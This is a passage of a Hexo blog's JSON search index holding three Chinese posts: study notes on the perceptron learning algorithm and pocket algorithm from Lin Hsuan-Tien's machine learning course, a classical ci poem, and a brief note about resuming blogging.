第一周、第二周","slug":"林轩田机器学习基石笔记-第一周、第二周","date":"2018-04-03T11:34:44.000Z","updated":"2019-01-24T13:31:39.197Z","comments":true,"path":"posts/机器学习/20180403-ml1.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20180403-ml1.html","excerpt":"第一周，基本概念 机器学习可以进行的条件： 1、 有某种模式可以学习。 2、 这种模式不知道怎么手工明确规定（如果通过编写可以实现的就不需要机器学习）。 3、 有数据资料。 机器学习四种元素： 1、 输入X。 2、 输出Y。 3、 hypothesis H。 4、 资料 D 数据挖掘和机器学习有很多重合点，但不是一模一样。","text":"第一周，基本概念 机器学习可以进行的条件： 1、 有某种模式可以学习。 2、 这种模式不知道怎么手工明确规定（如果通过编写可以实现的就不需要机器学习）。 3、 有数据资料。 机器学习四种元素： 1、 输入X。 2、 输出Y。 3、 hypothesis H。 4、 资料 D 数据挖掘和机器学习有很多重合点，但不是一模一样。 # 第二周，二元是非判断 ### Perceptron Hypothesis：感知器学习算法：针对线性可分的资料 - PLA算法（perceptron learning algorithm），两种理解方式： ① 向量纠正（比较直观，但证明很麻烦，推导不方便） 当y=+1，那么类似于第一个图，w+yx将使得新的w更加偏向于x，以使得修正后的结果为h(x)&gt;0，而类似有第二图的修正。 ② 梯度下降（以点到直线的距离（带符号）为代价函数进行随机梯度下降）此方法可获得向量纠正的一样的公式及结果。 此法以误分类点到直线的距离为代价函数，使用随机梯度下降获得最优解，因如果误分类点到超平面的距离都最小时，则误分类点在线性可分的情况下变为正确分类点。 算法特性：只能分类线性可分的模型。 - 噪音相对于数据应该较小 - PLA变形：pocket algorithm，速度比PLA慢: 使用一个随机的g0作为起始，存贮目前为止代价函数最小的情况，迭代规定的若干次后得到结果。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/tags/机器学习/"}]},{"title":"江城子 随想","slug":"随想","date":"2018-04-02T17:18:55.000Z","updated":"2018-04-04T12:26:06.858Z","comments":true,"path":"posts/杂文/20180403-thinking.html","link":"","permalink":"http://hachp1.github.io/posts/杂文/20180403-thinking.html","excerpt":"","text":"晨日暖阳斜倚窗。绿树桩，白屋房。 微风过面，虫鸣燕正忙。城中伊人早登墙，红笑靥，含蓄望。 料知心事不可想。蛾眉锁，轻拂妆。 路客打量，何事溢心房。遥寄命途多渴望，手心暖，思却凉。","categories":[{"name":"杂文","slug":"杂文","permalink":"http://hachp1.github.io/categories/杂文/"}],"tags":[{"name":"心情随笔","slug":"心情随笔","permalink":"http://hachp1.github.io/tags/心情随笔/"}]},{"title":"重拾HEXO","slug":"重拾HEXO","date":"2018-04-02T15:27:50.000Z","updated":"2018-04-04T12:27:05.770Z","comments":true,"path":"posts/uncategorized/20180402-return.html","link":"","permalink":"http://hachp1.github.io/posts/uncategorized/20180402-return.html","excerpt":"","text":"似乎从来没有开始过 之后会常来的 抛弃word 23333","categories":[],"tags":[]}]}